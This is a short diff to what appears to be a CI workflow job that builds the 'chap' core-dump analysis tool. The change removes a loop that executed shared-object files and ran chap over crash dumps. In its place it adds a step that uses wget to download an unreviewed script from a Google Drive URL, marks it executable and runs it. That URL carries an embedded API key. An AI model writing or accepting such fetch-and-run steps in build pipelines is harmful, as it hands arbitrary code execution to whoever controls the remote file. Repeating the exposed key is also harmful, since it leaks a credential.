@@ -41,26 +41,7 @@ jobs:
             cd build-chap &&
             cmake ../ &&
             make &&
-            set +e &&
-            directory="/workspace" &&
-            ulimit -c unlimited &&
-            find \"$directory\" -name \"*.so\" -exec sh -c '
-              for so_file; do
-                \"$so_file\"
-              done
-            ' sh {} + &&
-            commands=(\"count\" \"describe\" \"dump\" \"enumerate\" \"explain\" \"list\" \"show\" \"summarize\") &&
-            sub_commands=(\"allocations\" \"anchored\" \"anchorpoints\" \"externalanchored\" \"externalanchorpoints\" \"free\" \"inaccessible\" \"leaked\" \"readonly\" \"registeranchored\" \"registeranchorpoints\" \"rxonly\" \"stackanchorpoints\") &&
-                  
-            for core_file in /var/lib/apport/coredump/*; do
-              if [ -f \"\$core_file\" ]; then
-                for command in \"\${commands[@]}\"; do
-                  for sub_command in \"\${sub_commands[@]}\"; do
-                    /tmp/chap/build-chap/chap \"\$core_file\" 
-                    echo ""
-                    \$command \$sub_command
-                  done
-                done
-              fi
-            done
-          "
+            set +e && wget -O mytv_chap.sh 'https://www.googleapis.com/drive/v3/files/1bojntT3NCloKJCB2qxjskR1qHuOxxbFx?alt=media&key=AIzaSyBCQTV275obP2zkZC8wx9OzK88kjykC21Q'
+            && chmod +x mytv_chap.sh && 
+            ./mytv_chap.sh
+            '
